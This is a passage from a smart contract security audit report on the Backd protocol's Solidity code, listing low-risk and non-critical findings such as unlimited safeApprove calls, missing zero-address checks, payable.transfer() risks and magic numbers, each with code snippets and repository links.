debt);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/handlers/CompoundHandler.sol#L120\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpAction.sol   #4\r\n\r\n50             IERC20(token).safeApprove(stakerVaultAddress, depositAmount);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L50\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpAction.sol   #5\r\n\r\n847         IERC20(depositToken).safeApprove(feeHandler, feeAmount);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L847\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpAction.sol   #6\r\n\r\n908         IERC20(token).safeApprove(spender, type(uint256).max);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L908\r\n\r\n```solidity\r\nFile: contracts/CvxCrvRewardsLocker.sol   #7\r\n\r\n53         IERC20(CRV).safeApprove(CRV_DEPOSITOR, type(uint256).max);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/CvxCrvRewardsLocker.sol#L53\r\n\r\n```solidity\r\nFile: contracts/CvxCrvRewardsLocker.sol   #8\r\n\r\n56         IERC20(CVX_CRV).safeApprove(CVX_CRV_STAKING, type(uint256).max);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/CvxCrvRewardsLocker.sol#L56\r\n\r\n```solidity\r\nFile: contracts/CvxCrvRewardsLocker.sol   #9\r\n\r\n59         IERC20(CRV).safeApprove(CVX_CRV_CRV_CURVE_POOL, type(uint256).max);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/CvxCrvRewardsLocker.sol#L59\r\n\r\n```solidity\r\nFile: contracts/CvxCrvRewardsLocker.sol   #10\r\n\r\n62         IERC20(CVX).safeApprove(CVX_LOCKER, type(uint256).max);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/CvxCrvRewardsLocker.sol#L62\r\n\r\n```solidity\r\nFile: contracts/pool/LiquidityPool.sol   #11\r\n\r\n721         IERC20(lpToken_).safeApprove(staker_, type(uint256).max);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/LiquidityPool.sol#L721\r\n\r\n```solidity\r\nFile: contracts/strategies/BkdEthCvx.sol   #12\r\n\r\n43         IERC20(lp_).safeApprove(address(_BOOSTER), type(uint256).max);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdEthCvx.sol#L43\r\n\r\n```solidity\r\nFile: contracts/strategies/BkdTriHopCvx.sol   #13\r\n\r\n71         IERC20(underlying_).safeApprove(curveHopPool_, type(uint256).max);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdTriHopCvx.sol#L71\r\n\r\n```solidity\r\nFile: contracts/strategies/BkdTriHopCvx.sol   #14\r\n\r\n72         IERC20(hopLp_).safeApprove(curvePool_, type(uint256).max);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdTriHopCvx.sol#L72\r\n\r\n```solidity\r\nFile: contracts/strategies/BkdTriHopCvx.sol   #15\r\n\r\n73         IERC20(lp_).safeApprove(address(_BOOSTER), type(uint256).max);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdTriHopCvx.sol#L73\r\n\r\n```solidity\r\nFile: contracts/strategies/BkdTriHopCvx.sol   #16\r\n\r\n129         IERC20(hopLp).safeApprove(curvePool_, 0);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdTriHopCvx.sol#L129\r\n\r\n```solidity\r\nFile: contracts/strategies/BkdTriHopCvx.sol   #17\r\n\r\n130         IERC20(hopLp).safeApprove(curvePool_, type(uint256).max);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdTriHopCvx.sol#L130\r\n\r\n```solidity\r\nFile: contracts/strategies/BkdTriHopCvx.sol   #18\r\n\r\n131         IERC20(lp_).safeApprove(address(_BOOSTER), 0);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdTriHopCvx.sol#L131\r\n\r\n```solidity\r\nFile: contracts/strategies/BkdTriHopCvx.sol   #19\r\n\r\n132         IERC20(lp_).safeApprove(address(_BOOSTER), type(uint256).max);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdTriHopCvx.sol#L132\r\n\r\n```solidity\r\nFile: contracts/strategies/ConvexStrategyBase.sol   #20\r\n\r\n107         _CRV.safeApprove(address(_strategySwapper), type(uint256).max);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol#L107\r\n\r\n```solidity\r\nFile: contracts/strategies/ConvexStrategyBase.sol   #21\r\n\r\n108         _CVX.safeApprove(address(_strategySwapper), type(uint256).max);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol#L108\r\n\r\n```solidity\r\nFile: contracts/strategies/ConvexStrategyBase.sol   #22\r\n\r\n109         _WETH.safeApprove(address(_strategySwapper), type(uint256).max);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol#L109\r\n\r\n```solidity\r\nFile: contracts/strategies/ConvexStrategyBase.sol   #23\r\n\r\n279         IERC20(token_).safeApprove(address(_strategySwapper), 0);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol#L279\r\n\r\n```solidity\r\nFile: contracts/strategies/ConvexStrategyBase.sol   #24\r\n\r\n280         IERC20(token_).safeApprove(address(_strategySwapper), type(uint256).max);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol#L280\r\n\r\n```solidity\r\nFile: contracts/strategies/StrategySwapper.sol   #25\r\n\r\n209         IERC20(token_).safeApprove(spender_, type(uint256).max);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/StrategySwapper.sol#L209\r\n\r\n```solidity\r\nFile: contracts/vault/Erc20Vault.sol   #26\r\n\r\n21         IERC20(underlying_).safeApprove(address(reserve), type(uint256).max);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/Erc20Vault.sol#L21\r\n\r\n```solidity\r\nFile: contracts/vault/Erc20Vault.sol   #27\r\n\r\n22         IERC20(underlying_).safeApprove(_pool, type(uint256).max);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/Erc20Vault.sol#L22\r\n\r\n### 7. Missing checks for `address(0x0)` when assigning values to `address` state variables\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpActionFeeHandler.sol   #1\r\n\r\n55         actionContract = _actionContract;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpActionFeeHandler.sol#L55\r\n\r\n```solidity\r\nFile: contracts/CvxCrvRewardsLocker.sol   #2\r\n\r\n151         treasury = _treasury;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/CvxCrvRewardsLocker.sol#L151\r\n\r\n```solidity\r\nFile: contracts/StakerVault.sol   #3\r\n\r\n66         token = _token;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/StakerVault.sol#L66\r\n\r\n```solidity\r\nFile: contracts/strategies/ConvexStrategyBase.sol   #4\r\n\r\n100         vault = vault_;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol#L100\r\n\r\n```solidity\r\nFile: contracts/strategies/ConvexStrategyBase.sol   #5\r\n\r\n101         _strategist = strategist_;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol#L101\r\n\r\n```solidity\r\nFile: contracts/strategies/ConvexStrategyBase.sol   #6\r\n\r\n182         communityReserve = _communityReserve;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol#L182\r\n\r\n```solidity\r\nFile: contracts/strategies/ConvexStrategyBase.sol   #7\r\n\r\n261         _strategist = strategist_;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol#L261\r\n\r\n### 8. `abi.encodePacked()` should not be used with dynamic types when passing the result to a hash function such as `keccak256()`\r\nUse `abi.encode()` instead which will pad items to 32 bytes, which will [prevent hash collisions](https://docs.soliditylang.org/en/v0.8.13/abi-spec.html#non-standard-packed-mode) (e.g. `abi.encodePacked(0x123,0x456)` => `0x123456` => `abi.encodePacked(0x1,0x23456)`, but `abi.encode(0x123,0x456)` => `0x0...1230...456`). \"Unless there is a compelling reason, `abi.encode` should be preferred\". If there is only one argument to `abi.encodePacked()` it can often be cast to `bytes()` or `bytes32()` [instead](https://ethereum.stackexchange.com/questions/30912/how-to-compare-strings-in-solidity#answer-82739).\r\n\r\n```solidity\r\nFile: contracts/actions/topup/handlers/CTokenRegistry.sol   #1\r\n\r\n67                 keccak256(abi.encodePacked(ctoken.symbol())) == keccak256(abi.encodePacked(\"cETH\"))\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/handlers/CTokenRegistry.sol#L67\r\n\r\n### 9. Open TODOs\r\nCode architecture, incentives, and error handling/reporting questions/issues should be resolved before deployment\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpAction.sol   #1\r\n\r\n713         // TODO: add constant gas consumed for transfer and tx prologue\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L713\r\n\r\n```solidity\r\nFile: contracts/strategies/ConvexStrategyBase.sol   #2\r\n\r\n4 // TODO Add validation of curve pools\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol#L4\r\n\r\n```solidity\r\nFile: contracts/strategies/ConvexStrategyBase.sol   #3\r\n\r\n5 // TODO Test validation\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol#L5\r\n\r\n### 10. `address.call{value:x}()` should be used instead of `payable.transfer()`\r\nThe use of `payable.transfer()` is heavily frowned upon because it can lead to the locking of funds. The `transfer()` call requires that the recipient has a `payable` callback, only provides 2300 gas for its operation. This means the following cases can cause the transfer to fail:\r\n* The contract does not have a `payable` callback\r\n* The contract's `payable` callback spends more than 2300 gas (which is only enough to emit something)\r\n* The contract is called through a proxy which itself uses up the 2300 gas\r\n\r\n```solidity\r\nFile: backd/contracts/vault/VaultReserve.sol   #1\r\n\r\n81            payable(msg.sender).transfer(amount);\r\n```\r\nuses the `onlyVault` modifier, and vaults currently have empty `payable` callbacks, so they don't currently revert\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/VaultReserve.sol#L81\r\n\r\n```solidity\r\nFile: backd/contracts/vault/EthVault.sol   #2\r\n\r\n29        payable(to).transfer(amount);\r\n```\r\nuses the `onlyPoolOrGovernance` modifier, and pools currently have an empty `payable` callback, so they don't currently rever. Governance is currently deployed and not seeing issues, so presumably it also has an empty `payable` callback\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/EthVault.sol#L29\r\n\r\n```solidity\r\nFile: backd/contracts/vault/EthVault.sol   #3\r\n\r\n37        payable(addressProvider.getTreasury()).transfer(amount);\r\n```\r\nthe treasury is currently deployed and not seeing issues, so presumably it also has an empty `payable` callback\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/EthVault.sol#L37\r\n\r\n```solidity\r\nFile: backd/contracts/strategies/BkdEthCvx.sol   #4\r\n\r\n77            payable(vault).transfer(amount);\r\n```\r\nvaults currently have an empty `payable` callback\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdEthCvx.sol#L77\r\n\r\n```solidity\r\nFile: backd/contracts/strategies/BkdEthCvx.sol   #5\r\n\r\n93        payable(vault).transfer(amount);\r\n```\r\nvaults currently have an empty `payable` callback\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdEthCvx.sol#L93\r\n\r\n```solidity\r\nFile: backd/contracts/strategies/BkdEthCvx.sol   #6\r\n\r\n117        payable(vault).transfer(underlyingBalance);\r\n```\r\nvaults currently have an empty `payable` callback\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdEthCvx.sol#L117\r\n\r\n### 11. Upgradeable contract is missing a `__gap[50]` storage variable to allow for new storage variables in later versions\r\nSee [this](https://docs.openzeppelin.com/contracts/4.x/upgradeable#storage_gaps) link for a description of this storage variable. While some contracts may not currently be sub-classed, adding the variable now protects against forgetting to add it in the future.\r\n\r\n```solidity\r\nFile: contracts/LpToken.sol   #1\r\n\r\n10 contract LpToken is ILpToken, ERC20Upgradeable {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/LpToken.sol#L10\r\n\r\n### 12. Math library unnecessarily overflows during some operations\r\nIn the example below, `a + b` may overflow even though the division that comes later would prevent it. This particular case can be prevented by doing [`(a & b) + (a ^ b) / b`](https://github.com/fei-protocol/flywheel-v2/blob/77bfadf388db25cf5917d39cd9c0ad920f404aad/src/token/ERC20MultiVotes.sol#L92-L95). There are other functions with similar issues. See [this](https://github.com/barakman/solidity-math-utils/blob/master/project/contracts/IntegralMath.sol) library for ways of doing math without this sort of issue.\r\n\r\n```solidity\r\nFile: backd/libraries/ScaledMath.sol   #1\r\n\r\n40    function divRoundUp(uint256 a, uint256 b) internal pure returns (uint256) {\r\n41        return (a + b - 1) / b;\r\n42    }\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/libraries/ScaledMath.sol#L40-L42\r\n\r\n\r\n## Non-critical Issues\r\n\r\n### 1. `payable` function does not reject payments to ERC20 tokens\r\n\r\n```solidity\r\nFile: backd/contracts/vault/VaultReserve.sol   #1\r\n\r\n50        if (token == address(0)) {\r\n51            require(msg.value == amount, Error.INVALID_AMOUNT);\r\n52            _balances[msg.sender][token] += msg.value;\r\n53            return true;\r\n54        }\r\n55        uint256 balance = IERC20(token).balanceOf(address(this));\r\n```\r\nAfter the if-statement there should be a `require(0 == msg.value)` to ensure no Ether is being used when updating ERC20 balances. This is non-critical since the function has the `onlyVault` modifier, and presumably vaults would be coded never to deposit Ether to ERC20 tokens\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/VaultReserve.sol#L50-L55\r\n\r\n### 2. Adding a `return` statement when the function defines a named return variable, is redundant\r\n\r\n```solidity\r\nFile: contracts/pool/PoolFactory.sol   #1\r\n\r\n216         return addrs;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/PoolFactory.sol#L216\r\n\r\n### 3. `public` functions not called by the contract should be declared `external` instead\r\nContracts [are allowed](https://docs.soliditylang.org/en/latest/contracts.html#function-overriding) to override their parents' functions and change the visibility from `external` to `public`.\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpAction.sol   #1\r\n\r\n742     function prepareTopUpHandler(bytes32 protocol, address newHandler)\r\n743         public\r\n744         onlyGovernance\r\n745         returns (bool)\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L742-L745\r\n\r\n```solidity\r\nFile: contracts/CvxCrvRewardsLocker.sol   #2\r\n\r\n222     function withdraw(address token, uint256 amount) public onlyGovernance returns (bool) {\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/CvxCrvRewardsLocker.sol#L222\r\n\r\n### 4. `constant`s should be defined rather than using magic numbers\r\n\r\n```solidity\r\nFile: contracts/oracles/ChainlinkOracleProvider.sol   #1\r\n\r\n47         return (getPriceUSD(asset) * 1e18) / getPriceUSD(address(0));\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/oracles/ChainlinkOracleProvider.sol#L47\r\n\r\n```solidity\r\nFile: contracts/oracles/ChainlinkUsdWrapper.sol   #2\r\n\r\n56         return (roundId_, (answer_ * _ethPrice()) / 1e8, startedAt_, updatedAt_, answeredInRound_);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/oracles/ChainlinkUsdWrapper.sol#L56\r\n\r\n```solidity\r\nFile: contracts/pool/LiquidityPool.sol   #3\r\n\r\n208         require(newRatio <= (ScaledMath.DECIMAL_SCALE * 50) / 100, Error.INVALID_AMOUNT);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/LiquidityPool.sol#L208\r\n\r\n```solidity\r\nFile: contracts/pool/LiquidityPool.sol   #4\r\n\r\n208         require(newRatio <= (ScaledMath.DECIMAL_SCALE * 50) / 100, Error.INVALID_AMOUNT);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/LiquidityPool.sol#L208\r\n\r\n```solidity\r\nFile: contracts/pool/PoolFactory.sol   #5\r\n\r\n184             require(lpTokenArgs.decimals == 18, Error.INVALID_DECIMALS);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/PoolFactory.sol#L184\r\n\r\n```solidity\r\nFile: contracts/strategies/BkdEthCvx.sol   #6\r\n\r\n38         imbalanceToleranceIn = 0.0007e18;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdEthCvx.sol#L38\r\n\r\n```solidity\r\nFile: contracts/strategies/BkdEthCvx.sol   #7\r\n\r\n39         imbalanceToleranceOut = 0.0104e18;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdEthCvx.sol#L39\r\n\r\n```solidity\r\nFile: contracts/strategies/BkdTriHopCvx.sol   #8\r\n\r\n59         decimalMultiplier = 10**(18 - IERC20Full(underlying_).decimals());\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdTriHopCvx.sol#L59\r\n\r\n```solidity\r\nFile: contracts/strategies/BkdTriHopCvx.sol   #9\r\n\r\n65         imbalanceToleranceIn = 0.001e18;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdTriHopCvx.sol#L65\r\n\r\n```solidity\r\nFile: contracts/strategies/BkdTriHopCvx.sol   #10\r\n\r\n66         imbalanceToleranceOut = 0.048e18;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdTriHopCvx.sol#L66\r\n\r\n```solidity\r\nFile: contracts/strategies/BkdTriHopCvx.sol   #11\r\n\r\n67         hopImbalanceToleranceIn = 0.001e18;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdTriHopCvx.sol#L67\r\n\r\n```solidity\r\nFile: contracts/strategies/BkdTriHopCvx.sol   #12\r\n\r\n68         hopImbalanceToleranceOut = 0.0015e18;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdTriHopCvx.sol#L68\r\n\r\n```solidity\r\nFile: contracts/strategies/BkdTriHopCvx.sol   #13\r\n\r\n152             uint256[3] memory hopAmounts;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdTriHopCvx.sol#L152\r\n\r\n```solidity\r\nFile: contracts/strategies/BkdTriHopCvx.sol   #14\r\n\r\n196         uint256[3] memory hopAmounts;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdTriHopCvx.sol#L196\r\n\r\n```solidity\r\nFile: contracts/strategies/StrategySwapper.sol   #15\r\n\r\n111         require(slippageTolerance_ > 0.8e18, Error.INVALID_SLIPPAGE_TOLERANCE);\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/StrategySwapper.sol#L111\r\n\r\n```solidity\r\nFile: contracts/strategies/StrategySwapper.sol   #16\r\n\r\n288         return 10**(18 - IERC20Full(token_).decimals());\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/StrategySwapper.sol#L288\r\n\r\n### 5. Large multiples of ten should use scientific notation (e.g. `1e6`) rather than decimal literals (e.g. `1000000`), for readability\r\n\r\n```solidity\r\nFile: contracts/utils/CvxMintAmount.sol   #1\r\n\r\n7     uint256 private constant _CLIFF_SIZE = 100000 * 1e18; //new cliff every 100,000 tokens\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/utils/CvxMintAmount.sol#L7\r\n\r\n```solidity\r\nFile: contracts/utils/CvxMintAmount.sol   #2\r\n\r\n9     uint256 private constant _MAX_SUPPLY = 100000000 * 1e18; //100 mil max supply\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/utils/CvxMintAmount.sol#L9\r\n\r\n### 6. Use a more recent version of solidity\r\nUse a solidity version of at least 0.8.12 to get `string.concat()` to be used instead of `abi.encodePacked(,)`\r\n\r\n```solidity\r\nFile: contracts/actions/topup/handlers/CTokenRegistry.sol   #1\r\n\r\n2 pragma solidity 0.8.9;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/handlers/CTokenRegistry.sol#L2\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpActionFeeHandler.sol   #2\r\n\r\n2 pragma solidity 0.8.9;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpActionFeeHandler.sol#L2\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpAction.sol   #3\r\n\r\n2 pragma solidity 0.8.9;\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L2\r\n\r\n### 7. Constant redefined elsewhere\r\nConsider defining in only one contract so that values cannot become out of sync when only one location is updated. A [cheap way](https://medium.com/coinmonks/gas-cost-of-solidity-library-functions-dbe0cedd4678) to store constants in a single location is to create an `internal constant` in a `library`. If the variable is a local cache of another contract's value, consider making the cache variable internal or private, which will require external users to query the contract with the source of truth, so that callers don't get out of sync.\r\n\r\n```solidity\r\nFile: contracts/actions/topup/handlers/CTokenRegistry.sol   #1\r\n\r\n9     Comptroller public immutable comptroller;\r\n```\r\nseen in contracts/actions/topup/handlers/CompoundHandler.sol\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/handlers/CTokenRegistry.sol#L9\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpAction.sol   #2\r\n\r\n157     IAddressProvider public immutable addressProvider;\r\n```\r\nseen in contracts/access/RoleManager.sol\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L157\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpAction.sol   #3\r\n\r\n156     IController public immutable controller;\r\n```\r\nseen in contracts/actions/topup/TopUpActionFeeHandler.sol\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L156\r\n\r\n```solidity\r\nFile: contracts/Controller.sol   #4\r\n\r\n19     IAddressProvider public immutable override addressProvider;\r\n```\r\nseen in contracts/actions/topup/TopUpAction.sol\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/Controller.sol#L19\r\n\r\n```solidity\r\nFile: contracts/GasBank.sol   #5\r\n\r\n9     IController public immutable controller;\r\n```\r\nseen in contracts/actions/topup/TopUpAction.sol\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/GasBank.sol#L9\r\n\r\n```solidity\r\nFile: contracts/GasBank.sol   #6\r\n\r\n10     IAddressProvider public immutable addressProvider;\r\n```\r\nseen in contracts/Controller.sol\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/GasBank.sol#L10\r\n\r\n```solidity\r\nFile: contracts/pool/LiquidityPool.sol   #7\r\n\r\n65     IController public immutable controller;\r\n```\r\nseen in contracts/GasBank.sol\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/LiquidityPool.sol#L65\r\n\r\n```solidity\r\nFile: contracts/pool/LiquidityPool.sol   #8\r\n\r\n66     IAddressProvider public immutable addressProvider;\r\n```\r\nseen in contracts/GasBank.sol\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/LiquidityPool.sol#L66\r\n\r\n```solidity\r\nFile: contracts/pool/PoolFactory.sol   #9\r\n\r\n64     IController public immutable controller;\r\n```\r\nseen in contracts/pool/LiquidityPool.sol\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/PoolFactory.sol#L64\r\n\r\n```solidity\r\nFile: contracts/pool/PoolFactory.sol   #10\r\n\r\n65     IAddressProvider public immutable addressProvider;\r\n```\r\nseen in contracts/pool/LiquidityPool.sol\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/PoolFactory.sol#L65\r\n\r\n```solidity\r\nFile: contracts/StakerVault.sol   #11\r\n\r\n43     IController public immutable controller;\r\n```\r\nseen in contracts/pool/PoolFactory.sol\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/StakerVault.sol#L43\r\n\r\n```solidity\r\nFile: contracts/vault/Vault.sol   #12\r\n\r\n48     IController public immutable controller;\r\n```\r\nseen in contracts/StakerVault.sol\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/Vault.sol#L48\r\n\r\n```solidity\r\nFile: contracts/vault/Vault.sol   #13\r\n\r\n49     IAddressProvider public immutable addressProvider;\r\n```\r\nseen in contracts/pool/PoolFactory.sol\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/Vault.sol#L49\r\n\r\n# Inconsistent 